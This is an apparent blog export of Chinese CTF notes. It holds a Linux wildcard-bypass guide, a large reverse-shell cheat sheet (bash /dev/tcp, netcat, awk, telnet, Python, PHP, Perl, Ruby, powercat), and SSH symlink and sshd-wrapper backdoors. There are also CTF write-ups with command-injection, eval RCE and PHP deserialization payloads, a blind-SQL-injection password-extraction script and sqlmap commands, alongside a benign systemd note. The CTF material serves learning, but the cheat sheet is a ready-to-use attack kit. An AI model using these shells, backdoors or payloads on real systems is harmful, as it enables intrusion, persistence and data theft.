传递给脚本或函数的所有参数。，而参数不存在时其值为空。被双引号包函时，与$*稍有不同 $? 上个命令的推出状态，或函数的返回值 $$ 当前shell进程ID 通配符详细参考阮一峰的网络日志——命令行通配符教程 字符 解释 * 匹配任意长度任意字符 ？ 匹配任意单个字符 [list] 匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合 [^list] 匹配指定范围外的任意单个字符或字符集合 [!list] 同上 {str1,str2} 匹配str1或者str2字符，也可以是集合 IFS 由或或 CR 由产生 ! 执行history中的命令 其中： […]表示匹配方括号之中的任意一个字符。比如[aeiou]可以匹配五个元音字母，[a-z]匹配任意小写字母。 {…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。 1234567891011121314151617181920echo d&#123;a,e,i,u,o&#125;gdag deg dig dug dog#大括号可以嵌套使用echo &#123;j&#123;p,pe&#125;g,png&#125;jpg jpeg png#&#123;start..end&#125;匹配连续字符cat &#x2F;f&#123;a..z&#125;agcat: &#x2F;faag: 没有那个文件或目录cat: &#x2F;fbag: 没有那个文件或目录cat: &#x2F;fcag: 没有那个文件或目录cat: &#x2F;fdag: 没有那个文件或目录cat: &#x2F;feag: 没有那个文件或目录cat: &#x2F;ffag: 没有那个文件或目录cat: &#x2F;fgag: 没有那个文件或目录cat: &#x2F;fhag: 没有那个文件或目录cat: &#x2F;fiag: 没有那个文件或目录cat: &#x2F;fjag: 没有那个文件或目录cat: &#x2F;fkag: 没有那个文件或目录flag&#123;test&#125;... {…}与[…]有一个很重要的区别。如果匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开。 通配符有时可以起奇效 12cat fla* cat$&#123;IFS&#125;fl* **注意:**又是还会遇到flag 的贪婪匹配/.*f*.l*.a*.g*/这是拼接什么的基本不能用,就不得不考虑编码等其他姿势 反弹shell目标机执行反弹shell的命令,攻击机用nc开启监听就行 攻击机1nc -lvvp 8080 目标机bash1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.1168.0.1&#x2F;8080 0&gt;&amp;1 exec1exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done ssh12345678910111213141516171819受害主机执行:ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;8080; 攻击机器:ssh root@192.168.3.251 -p 8080 [用户名root,密码随意]简易SSH wrapper后门(原理未测试)受害主机执行:cd &#x2F;usr&#x2F;sbinmv sshd ..&#x2F;binecho &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt; sshdecho &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if (getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshdecho &#39;exec &#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshdchmod u+x sshd&#x2F;etc&#x2F;init.d&#x2F;sshd restart攻击机器:socat STDIO TCP4:x.x.x.x:22,souceport&#x3D;13337 NC反弹1234567891011#nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）nc -e &#x2F;bin&#x2F;sh ip port#受害主机:rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc x.x.x.x 8080 &gt; &#x2F;tmp&#x2F;f#攻击主机先监听8080端口:nc -lvvp 8080#类似的命令mknod backpipe p;nc ip prot 0&lt;backpipe | &#x2F;bin&#x2F;bash 1&gt;backpipe 2&gt;backpipe Awk**注意:**攻击的机器监听，在收到shell的时候不可以只输入enter，不然会断开 1awk &#39;BEGIN&#123;s&#x3D;&quot;&#x2F;inet&#x2F;tcp&#x2F;0&#x2F;ip&#x2F;port&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#39; Telnet反弹1234567891011受害主机:telnet 192.168.3.251 8080 | &#x2F;bin&#x2F;bash | telnet 192.168.3.251 1080攻击主机:nc -lvp 1080 nc -lvp 8080 &#x2F;&#x2F;这里输入命令可以在1080看到结果受害机器:mknod test p &amp;&amp; telnet ip port 0&lt;test | &#x2F;bin&#x2F;bash 1&gt;test攻击：nc -lvvp 8080top命令看不到结果，因为不是tty python123python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;#还可以配合ssti注入执行bash反弹 php1php -r &#39;$sock&#x3D;fsockopen(&quot;ip&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; Perl1perl -e &#39;use Socket;$i&#x3D;&quot;ip&quot;;$p&#x3D;prot;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;;&#39; Ruby1ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39; Windwos1234567WIndowsPS C:\\&gt; Import-Module .\\powercat.ps1PS C:\\&gt; powercat -c 192.168.3.251 -p 8081 -e cmd -g &gt;&gt; payload.ps1# nc -lvp 8081 然后开始监听payload回连的端口powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &#39;C:\\payload.ps1&#39;&#125;&quot;#挂在后台执行 查看内容命令1cat、tac、more、less、head、tail、nl、sed、sort、uniq","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"Linux命令","slug":"Linux命令","permalink":"https://yanmymickey.github.io/tags/Linux%E5%91%BD%E4%BB%A4/"}]},{"title":"CTFSHOW平台萌新赛WP","date":"2020-03-05T16:00:00.000Z","path":"2020/03/06/CTF_WP/ctfshow_萌新赛/","text":"CTFSHOW平台萌新赛web、Crypto部分miscWEBweb签到代码很简单,命令执行 利用命令分隔符 payload 123https:&#x2F;&#x2F;e6c17fd8-28c8-4708-8fb5-9463ed500e16.chall.ctf.show&#x2F;?url&#x3D;1;ls;echohttps:&#x2F;&#x2F;e6c17fd8-28c8-4708-8fb5-9463ed500e16.chall.ctf.show&#x2F;?url&#x3D;1;cat%20flag;echo web给她扫目录.发现git泄露,githack扒下来,代码不全,但是可以看到hitn.php 1234&lt;?php$pass&#x3D;sprintf(&quot;and pass&#x3D;&#39;%s&#39;&quot;,addslashes($_GET[&#39;pass&#39;]));$sql&#x3D;sprintf(&quot;select * from user where name&#x3D;&#39;%s&#39; $pass&quot;,addslashes($_GET[&#39;name&#39;]));?&gt; 利用sprintf和addslashes的漏洞 参考搜的一篇文章【PHP】由一次CTF引发的学习笔记之PHP的sprintf函数 打开是404页面,但是f12查看状态码是200,说明是假的404,而且有php文件显示,f12,发现html页面的注释提示,查看cookies,发现是16进制,转换是flag.txt,先考虑直接文件包含,提示no flag再考虑根据利用伪协议,先试了base64,提示no base64,换成rot13成功读取 php://filter/read=string.rot13/resource=/flag web假赛生瞎蒙的 页面源代码说要登录 没有账号,先注册 先注册admin,不允许 admın admın(不懂原理,瞎蒙的)注册, 用admin admin登录,成功登录admin 根据正则匹配,c不传值就可以过 web数据及格了robots.txt,发现使用debug 计算机,按个1+1,发现数据包,在最后随便加个符号 1http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;1&amp;operator&#x3D;%2B&amp;number2&#x3D;1&#123; 出现报错页面,报错最后发现eval和判断 核心代码,刚开始想利用利用eval反弹shell,但是失败了 利用eval,导入os库,执行代码 1http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;1&amp;operator&#x3D;%2B&amp;number2&#x3D;1%2Bint(__import__(%27os%27).popen(%22ls%22).read()) 列目录后发现flag.sh,再读flag.sh 1[http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;1&amp;operator&#x3D;%2B&amp;number2&#x3D;1%2Bint(__import__(%27os%27).popen(%22cat%20flag.sh%22).read())](http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;1&amp;operator&#x3D;%2B&amp;number2&#x3D;1%2Bint(__import__(&#39;os&#39;).popen(&quot;cat flag.sh&quot;).read())) 读取到真正的flag位置 1http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;0&amp;operator&#x3D;%2B&amp;number2&#x3D;0%2Bint(__import__(&#39;os&#39;).popen(&quot;cat%20&#x2F;home&#x2F;ctf&#x2F;web&#x2F;flag&quot;).read()) web_萌新记忆dirmap扫目录,扫出后台登录 登录admin admin,提示密码错误,改变用户名提示用户名/密码错误 推断是先判断用户名,在判断密码,尝试弱口令密码爆破,github找了两个字典10000条数据bp没跑出来,尝试sql注入,过滤了很多字符,大致判断了一下 1234合法| &#39; , length left &lt; substr 空格过滤&quot; . or &amp; and ; # + - union select from mid ascii order table &gt; &#x3D; 注释符都过滤掉了,但是单给一个引号会报错,所以应该有注入方法 搜搜找找,找到参考资料CTF利用 Burpsuite Fuzz 实现 SQL 注入 推测应该差不多,看懂之后,测试 payload 1234567891011u&#x3D;&#39;||xxx||&#39;&amp;p&#x3D;123#第一个随便写的,尝试一下发现报错,unknown column#于是再试u&#x3D;&#39;||u||&#39;&amp;p&#x3D;123u&#x3D;&#39;||length(u)&lt;5||&#39;&amp;p&#x3D;123u&#x3D;&#39;||length(u)&lt;6||&#39;&amp;p&#x3D;123u&#x3D;&#39;||length(pwd)||&#39;&amp;p&#x3D;123u&#x3D;&#39;||length(password)||&#39;&amp;p&#x3D;123u&#x3D;&#39;||length(p)||&#39;&amp;p&#x3D;123u&#x3D;&#39;||length(p)&lt;17||&#39;&amp;p&#x3D;123u&#x3D;&#39;||length(p)&lt;18||&#39;&amp;p&#x3D;123 上面这些可以得到一些信息,表中字段是u,p,账号是admin,密码是17位 然后就是利用相同原理进行盲注了脚本 123456789101112131415161718192021222324252627282930313233343536373839import requestss&#x3D;requests.session()url&#x3D;&quot;https:&#x2F;&#x2F;30f04198-23e0-4a0e-a14d-e29e8a13aea6.chall.ctf.show&#x2F;admin&#x2F;checklogin.php&quot;def get_length(): for i in range(1,127): postdata &#x3D; &#123; &#39;u&#39;:&quot;&#39;||length(p)&lt;&quot;+str(i)+&quot;||&#39;&quot;, &#39;p&#39;:&#39;123&#39; &#125; print(i,postdata) r &#x3D; s.post(url,data&#x3D;postdata) if &#39;用户名&#39;not in r.text: print(&quot;get length! length&#x3D;&quot;+str(i-1)) return idef get_pwd_char(): pwd &#x3D; &#39;&#39; strs &#x3D; &#39;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39; for i in range(0,length): for c in strs: postdata &#x3D; &#123; &#39;u&#39;:&quot;&#39;||substr(p,&quot;+str(i+1)+&quot;,1)&lt;&#39;&quot;+str(c), &#39;p&#39;:&#39;123&#39; &#125; # print(i,postdata) r &#x3D; s.post(url&#x3D;url,data&#x3D;postdata) # print(r.text) if &#39;用户名&#39; not in r.text and &#39;密码&#39; in r.text: pwd +&#x3D; chr(ord(c)-1) # print(pwd) break print(chr(ord(c) - 1),end&#x3D;&#39;&#39;) print(&quot;||&quot;+str(i+1),pwd)if __name__ &#x3D;&#x3D; &#39;__main__&#39;: length&#x3D;0 length&#x3D;get_length() #length is 17 get_pwd_char() 得到密码,登录得flag 杂项签到页面另存为,winhex打开,最下面诡异的20 09,20变0,09变1,转换成二进制,二进制转ASCII发现是morse,morse解码,base16解密 得flag 1flag&#123;MengMengDa&#125; 杂项萌新福利下下来,bin文件,不知道是什么东西,百度一个文件格式分析,是ABR,用ps打开,不兼容,群主提示取反,用010editor对十六进制按位取反,保存,再分析一下,可能是MP3,MP4用potplay打开,听出flag 杂项qrcode转换二维码脚本 1234567891011121314from PIL import ImageMAX &#x3D; 25img &#x3D; Image.new(&quot;RGB&quot;,(MAX,MAX))str&#x3D;&quot;1111111011100111101111111100000101011101000100000110111010010010010010111011011101010000110001011101101110101110110110101110110000010011011001010000011111111010101010101111111000000000011100110000000010000011010010111100110111010010110101100001001101100110100100111101111111111111100000000001101101110100101110100101101001011011011001000100100111111100111111111110110010000000010000011110111100110110010111111010110111111000100000000011101111000110101111111010101100101011011100000100011001110001011110111010010111101111101001011101000011101000110111101110100101000110000111010000010000100100100011101111111010110010101011111&quot;i &#x3D; 0for y in range (0,MAX): for x in range (0,MAX): if(str[i] &#x3D;&#x3D; &#39;1&#39;): img.putpixel([x,y],(0, 0, 0)) else: img.putpixel([x,y],(255,255,255)) i &#x3D; i+1img.show()img.save(&quot;flag.png&quot;) 杂项,千字文用Stegsolve打开,换换通道看看,多点几下,发现一个很多细小二维码的图片,另存为, 首先用切割软件切了,结果识别不出来,再用python切割,脚本网上都有,找一个改一改 1234567from PIL import Imagefilename &#x3D; r&#39;2.bmp&#39;img &#x3D; Image.open(filename)for i in range(29): for j in range(29): region &#x3D; img.crop(25 * j, 25 * i, 25 * (j + 1), 25 * (i + 1)) region.save(&#39;out&#x2F;&#123;&#125;&#123;&#125;.png&#39;.format(j, i)) 再用群里大佬分享的微微批量识别,在csv文件查找flag Crypto密码学签到base85得flag 抱我分析逻辑,每11位位一组,第一位是没用的字符,去掉第一位,剩下的就是flag中的字符,先遍历出flag中的字符 123456789101112131415161718192021222324252627282930import randomcstring &#x3D; &#39;abcdefghijklmnopqrstuvwxyz&#123;&#125;_0123456789&#39;key &#x3D; &#39;flag&#123;********&#125;&#39;length &#x3D; 300def encode(): res &#x3D; &#39;&#39; for i in range(1, length): c &#x3D; random.randint(0, 36) # print(c) res +&#x3D; cstring[c] # print(res) for n in range(10): c &#x3D; random.randint(0, len(key) - 1) res +&#x3D; key[c] # print(res) return res# encode()str &#x3D; &quot;qdfl33&#123;6&#123;6gs3afa6&#123;3&#125;agf&#123;&#125;aagdf&#125;6fl36d&#123;dfl&#123;6ay6gafddfg&#125;&#123;j3f&#125;&#125;6la&#123;3&#125;bfdf3&#125;gla&#125;65&#125;lg6g6dflf0&#123;dfgd3fdfgc&#123;g6a&#125;a3&#123;6&#125;mfa&#123;&#125;f&#125;f&#125;&#125;&#125;3363&#125;&#125;f6a6a7g&#123;a&#125;g66&#123;d3xgfffg&#125;a&#125;3&#125;_&#123;lad&#125;a33ga5fd33&#125;&#123;&#123;dl&#125;&#123;&#125;f&#123;3da&#125;g&#125;3egfal&#123;a3l&#125;3f33&#125;dfdda&#123;3sa&#123;d6g&#123;ff&#125;6vgl33d6g333h&#123;gd&#123;&#123;lg6ldg&#123;ad&#123;3333a6oalf6a&#123;33&#123;de3&#123;fa&#125;ggl&#123;abfd&#125;6&#125;6&#125;&#125;l33fa&#125;f&#123;&#123;3&#123;3fla&#125;a6&#125;af&#125;&#123;amg&#125;&#123;&#123;d&#125;&#125;a6gallfg36&#123;g3dh&#123;&#123;&#123;a&#123;lfg3&#123;sll6g6gfaggid6d&#123;3afl&#125;3rff3gfad3d&#125;1dlllff6&#125;6&#125;h3g66gla336b&#123;6d3gf&#125;f&#123;30d63l&#125;3dfl6a3llfgld3&#123;&#125;qg&#125;gf&#125;dg&#123;6l&#125;3gal&#125;agdl6&#123;lg&#123;g&#125;ddfaaealf&#123;f3llgge3ad3&#123;3adf&#123;c&#125;fllf6f&#125;3at&#123;aag&#125;a66d3&#125;ad&#123;dfg&#123;&#125;dlz6gld&#125;6&#123;3flxgf&#123;3g3ald&#125;3g&#125;g63f6ggf3&#125;gfd&#125;f3ga3efllf6&#125;363fu6366fdlggfx6&#125;6l3&#125;&#125;a&#123;afg&#123;&#123;&#125;&#125;3fdaluaa&#125;al&#123;dg3dpfga&#125;&#125;l&#125;d3l4afg&#125;f&#123;d&#123;lgcfgffglal&#125;dq6l&#125;fgflldavdad6&#125;df&#123;&#125;dw&#125;l6g&#125;&#125;&#123;l3gf6fdaa66aadt&#125;f6lg&#123;dg33h&#123;fa3d&#123;&#125;laao3l6aal&#123;lfdv&#123;3dlf6af36bddg&#125;3ggad3o&#125;&#123;&#125;3g3fgddyffd3lddgdd6&#123;gdfl&#123;&#123;la3ild&#125;dg&#123;g&#125;dgef&#123;a3&#123;d6dfgq3adll&#123;fdadt&#125;66fdflg&#123;3x&#123;l3ll&#125;3&#123;&#123;g4a3af6lag3gdaf66dadg6dfglaf66l3f&#123;2&#125;6&#123;afaf&#125;3l6all&#125;&#123;l&#125;lfdla6&#123;fgff&#123;&#125;g13dl&#123;a&#123;6&#123;l6rd6&#125;&#125;l3dgg3_f&#123;66gll&#123;f6a3d3dga6&#123;lg&#125;&#123;g&#125;d&#123;6&#123;d36lll3dd6&#123;3dg3afal&#125;d&#125;gff26&#125;l&#125;al&#125;&#125;&#123;a6&#125;g66gaaff&#125;0fga&#123;g6dfld&#123;&#123;&#125;fglf&#123;af&#125;iddf6g6&#125;l361&#123;ag&#125;&#123;&#123;dlfak&#125;&#123;d3fa&#123;6&#123;godgg&#123;l36a&#123;gmllgfa3fa&#123;&#125;f&#125;&#125;3&#123;a6&#123;a3&#123;nafg&#123;l3d6&#125;g2lf6&#123;gg&#125;&#123;g&#125;sg&#123;ga&#123;63g&#123;&#125;la6g&#123;g6&#123;&#123;63o6&#123;l&#125;&#123;3&#125;l3ag36&#123;af33g3dw6d33f3lfdan&#123;dddad&#123;&#123;6l6&#125;&#125;fad63lgd1ffaa&#125;g&#125;3flkg3d&#125;aalf3lbgf&#123;g&#125;f&#125;&#125;d3agf&#123;ld&#123;dl3l4fl&#123;&#123;3fla&#125;&#125;r3g&#125;&#123;&#125;gda&#123;&#125;_df3g&#125;fa36gq&#125;la&#123;f&#123;6l&#125;66fgdg&#125;6ag6feaal6all3&#123;d&#125;lfgl&#125;&#125;&#123;&#123;6lal&#125;gf&#125;&#125;gfgd4d&#123;g36daff&#125;l6fd63ag6&#125;f7&#125;l3&#123;&#123;d&#125;&#123;al6lff66gda&#125;f7dfaf6&#125;fd3ldfgfl36gf337a6al663afd&#123;dff&#125;6&#125;df&#123;lt&#125;66&#125;ag6a3&#123;na&#125;3la&#123;6daa&#125;63fgldf3ggcl6dd&#123;3fg&#123;&#125;&#125;gfgaf&#123;633lpfadalldgglg&#123;l&#125;&#123;6&#125;gf&#123;agf6&#123;3l3a366wa6l6&#125;fdla&#125;wfl&#125;33&#125;d&#123;6d6aa&#125;laldag&#125;bgaa3gff&#125;3db&#123;gd&#125;lfga3&#123;&#125;ffddd6&#125;&#123;la4&#125;3&#123;agdg3&#123;&#125;bf33adg3a632d&#125;66f&#125;dgd67&#125;&#123;333dfg&#125;&#125;mgg3all3l&#125;fd6dd3&#123;g&#125;&#123;&#125;&#125;v6&#125;a6f6lgd3nfgg6aff3a&#125;d3da&#123;l3ldldz&#123;&#125;&#123;&#125;g3&#125;6fdg6f&#123;gd&#123;g3adx&#123;gll6&#123;fg3dc63lf&#125;6dl&#123;d63f3g&#123;3adda5f3dgfla3&#123;6&#125;gd&#123;3&#123;d6dlldal6g66&#125;&#123;ddp&#125;lalafd&#125;d&#123;lgl&#125;g6g33agjg&#125;33dgf&#125;lg0adlda6gfdlx&#123;3g&#125;&#123;g3a&#123;a76&#125;gdf3la&#125;lh&#125;l&#123;l&#123;&#125;&#125;a6gm&#123;gdd&#123;agg&#125;6xfgg&#125;&#123;336&#125;d_a&#123;df3&#125;df33jgf&#125;6d3&#125;&#125;f&#125;h3l&#123;6ga6fll2&#125;dd&#123;l36d66&#125;ldafdlga3gbgd&#125;d6df&#125;ff1gf6a&#123;ll3a3w&#123;3g&#125;allfafldal&#125;aal&#125;dlra33l3f&#125;3dff&#123;6&#123;6&#125;f&#125;la&#125;lgf&#125;&#125;&#125;gd&#123;f3z3l3&#123;d3636dpl3fag3&#123;faa1&#123;3ga33l&#125;6ll6&#123;gg6&#125;ddf&#125;t6g&#125;&#123;gl6ggl&#123;d&#125;aafalf&#123;lw6a&#123;dad&#125;&#125;a3x&#123;ada&#123;fg6d&#125;a3g&#123;d&#123;fggdawdfal&#123;&#123;3dlfndl636&#125;36alv633ada6gf6hd&#123;3l66ddlfpglda&#125;&#123;g3fdogdfa3&#125;3g&#125;3k3d3gda33&#125;dvd&#125;laa&#123;fa&#123;a&#123;&#123;&#125;a&#125;36&#125;&#125;&#125;&#123;r6d6&#123;a6&#125;&#125;6&#123;0laa36gd&#123;36kf63a&#123;3&#125;gga4af6&#125;f3gfgf0lf&#123;6g&#125;&#123;&#123;6&#125;pafg6dg&#125;g6&#123;b&#125;3d36ad6d&#123;h6f3agff&#125;63p&#125;&#123;l3ag3&#125;lf1f3dgd&#123;66a37&#125;&#125;&#125;d6gglaftaf3l6a3&#123;&#123;a7&#123;lgd3d&#125;fl6tlfl663lgg3wa&#125;33gl&#125;d&#123;3i6aaagl6&#123;&#123;&#125;n3gd&#125;l3l6&#125;l7a&#123;gf&#123;a&#125;l&#125;f3al&#123;alg63fln&#123;&#123;dd&#125;3l&#123;ll1&#125;&#123;3g&#125;6&#123;6&#125;&#123;u63&#123;f3&#123;g6lgf&#123;3d&#125;&#123;636&#125;&#123;u3&#125;&#123;f6d&#123;&#123;d3lg&#123;3l6aldf&#123;i&#123;f366&#123;f3l&#123;eg&#123;d&#123;gll&#123;3dhgdgfgaf&#123;&#125;&#125;g&#125;&#123;lg3&#123;a&#123;flm&#125;fa3ldf&#123;d32fagllf&#123;&#123;66q363&#125;dl66gg2fa6af6d6g37lffl&#123;d&#123;3lltgl33&#125;&#125;&#123;&#125;d3o&#123;lfld3d&#123;&#125;a6a663a66&#123;fabfd6ld333g3rafa&#125;&#125;fddfgt&#123;ggad3ag&#125;lr63af6lgg&#125;gy&#123;6&#123;&#123;6&#125;6dd626&#123;gl6a&#123;ad3b3df&#125;alf3afdaf66ll&#125;lf6jd&#125;3&#123;6dldfgg&#125;f3lg63l&#123;lr3ff3l&#123;gafaa&#125;f&#125;agl6l33xglfggg&#123;&#123;&#123;fq66&#125;g6lfa3&#123;736lllflalglf&#125;&#123;&#125;gf&#123;aggdg3&#123;a&#125;&#125;da&#123;fp6fglla3l&#125;65gf36&#123;l6dl&#125;g&#125;f&#123;la6&#123;l&#123;fpf&#123;&#125;63&#123;f6gdfaalf6&#123;dffgdgf&#123;lgaf&#123;f&#123;56&#125;g6af63l6a&#125;a&#125;&#123;lfa&#123;3gblda&#125;l&#125;&#123;fl&#123;s&#123;g&#125;&#125;6&#123;g6la56g6g3&#123;f&#125;ddfaa&#123;l&#125;dg6g&#125;0glda6&#123;6d&#125;ff&#125;f&#123;6laadd6zaag&#123;l3l&#125;6dc&#125;f3gg&#125;lffgsag&#125;l3l6d3apd3gd3fd&#125;&#125;aga3ga&#125;a3&#123;6f1f3df&#123;&#123;d&#125;&#125;av3laf&#125;6adf3_d&#123;afa6f&#125;adt&#123;faf&#123;d33aaol3&#125;&#123;l&#125;ld&#125;3yl3a6a&#123;fa6&#125;_d33gf3fll&#125;of&#123;6lad&#125;&#125;fdx&#125;6d&#123;f&#125;ll63ugag66d&#123;6f3&#125;33&#125;al6l&#123;ffwf&#123;&#125;&#123;fl3a36ogg3&#123;&#125;&#125;g6&#125;3hl&#125;6dg6ld&#123;digaa&#125;g&#125;&#123;&#123;l&#125;da&#123;ddg3&#123;&#123;d&#125;w3&#125;ld&#125;adgg3m&#123;lad&#123;gd&#123;a&#123;7afff&#125;&#123;d6&#125;fsf3&#123;f&#125;gflgavfldg6a6&#123;ldqf&#125;fd&#123;f3f3&#125;73ddad&#123;666fz6&#125;d&#123;3&#123;l36a1d6fal3fl6lrl&#123;&#125;aga&#123;fdlsa&#125;&#123;6l6ag3gtgdg&#123;6lgf3f&quot;lengths &#x3D; len(str)flag &#x3D; &quot;&quot;for i in range(0, lengths): if i % 11 !&#x3D; 0: if str[i] not in flag: flag +&#x3D; str[i]print(flag) 再把结果中的几个字符拼成一句话 妈呀_完了群主提示就差把答案说出来了.二进制转ascii得到密文,AES加解密,密匙是20121221得flag","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"linux服务管理","date":"2020-02-29T16:00:00.000Z","path":"2020/03/01/Note/linux服务管理/","text":"linux服务管理在 System V(SysV)系统中查看运行的服务——service123456789101112#显示全部service --status-all#显示多数service --status-all | more#显示少数service --status-all | less#正在运行service --status-all | grep running#查看指定服务service --status-all | grep httpdorservice httpd status systemd 系统中管理运行的服务——systemctl查看12345678910111213141516#列出系统中服务systemctl#根据类型列出单元systemctl list-units --type service#根据状态列出单位systemctl list-unit-files --type service#查看运行中的服务systemctl | grep running#查看系统启动时会被启用的服务列表systemctl list-unit-files | grep enabled#查看指定服务systemctl | grep apache2orsystemctl status apache2#按资源使用情况（任务、CPU、内存、输入和输出）列出控制组：systemd-cgtop UNIT 相应的 systemd 单元名称 LOAD 相应的单元是否被加载到内存中 ACTIVE 该单元是否处于活动状态 SUB 该单元是否处于运行状态（LCTT 译注：是较于 ACTIVE 更加详细的状态描述，不同的单元类型有不同的状态。） DESCRIPTION 关于该单元的简短描述 注册服务1234567#配置文件目录#systemctl脚本目录：&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;#系统服务目录：&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;#用户服务目录usr&#x2F;lib&#x2F;systemd&#x2F;user&#x2F; 第一步 1234567891011121314151617181920212223242526272829303132333435363738394041424344在&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system目录下新建service-name.service文件：#nginx.service文件示例# Stop dance for nginx# &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;## ExecStop sends SIGSTOP (graceful stop) to the nginx process.# If, after 5s (--retry QUIT&#x2F;5) nginx is still running, systemd takes control# and sends SIGTERM (fast shutdown) to the main process.# After another 5s (TimeoutStopSec&#x3D;5), and if nginx is alive, systemd sends# SIGKILL to all the remaining processes in the process group (KillMode&#x3D;mixed).## nginx signals reference doc:# http:&#x2F;&#x2F;nginx.org&#x2F;en&#x2F;docs&#x2F;control.html#[Unit]#服务描述Description&#x3D;A high performance web server and a reverse proxy serverDocumentation&#x3D;man:nginx(8)#指定了在systemd在执行完那些target之后再启动该服务After&#x3D;network.target nss-lookup.target[Service]#定义Service的运行类型，一般是forking(后台运行) Type&#x3D;forkingPIDFile&#x3D;&#x2F;run&#x2F;nginx.pid#定义systemctl start|stop|reload *.service 的执行方法（具体命令需要写绝对路径）#启动前执行的命令ExecStartPre&#x3D;&#x2F;usr&#x2F;sbin&#x2F;nginx -t -q -g &#39;daemon on; master_process on;&#39;#启动时执行的命令ExecStart&#x3D;&#x2F;usr&#x2F;sbin&#x2F;nginx -g &#39;daemon on; master_process on;&#39;#重启时执行的命令ExecReload&#x3D;&#x2F;usr&#x2F;sbin&#x2F;nginx -g &#39;daemon on; master_process on;&#39; -s reload#停止时执行的命令ExecStop&#x3D;-&#x2F;sbin&#x2F;start-stop-daemon --quiet --stop --retry QUIT&#x2F;5 --pidfile &#x2F;run&#x2F;nginx.pid#停止服务时的等待的秒数,如果超过这个时间服务仍然没有停止,systemd会使用SIGKILL信号强行杀死服务的进程。 TimeoutStopSec&#x3D;5KillMode&#x3D;mixed#创建私有的内存临时空间PrivateTmp&#x3D;True[Install]#多用户WantedBy&#x3D;multi-user.target 第二步 改权限 1chmod 754 文件名 第三步 1234567891011#重载系统服务：systemctl daemon-reload#一些命令#设置开机启动：systemctl enable *.service#启动服务：systemctl start *.service#停止服务：systemctl stop *.service#重启服务：systemctl reload *.service","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"linux","slug":"linux","permalink":"https://yanmymickey.github.io/tags/linux/"}]},{"title":"合天御宅战疫-web-wp","date":"2020-02-28T16:00:00.000Z","path":"2020/02/29/CTF_WP/hetian/","text":"合天御宅战疫-web-wp签到 如图所示 改成key{XXXX}提交 脑袋有点大用bp抓包,在响应中找到key 统一登录打开界面,要登陆,登录不上,用dirmap扫一下目录 找到源码泄露,下载下来 代码审计 在common文件夹下找到home.php,wakeup函数有一个waf过滤,最下方的 12$a&#x3D;@$_POST[&#39;a&#39;];@unserialize($a); 可以想到构造反序列化对象,直接执行我们构造的对象,利用system函数,home后面的数字大于2可以绕过wakeup函数从而绕过过滤 构造payload 1a&#x3D;O:4:&quot;home&quot;:3:&#123;s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:&#123;i:0;s:26:&quot;127.0.0.1;cat &#x2F;opt&#x2F;key.txt&quot;;&#125;&#125; 后台key 存在数字型sql注入 用sqlmap跑一下 爆库 1sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot; -p &quot;cid&quot; 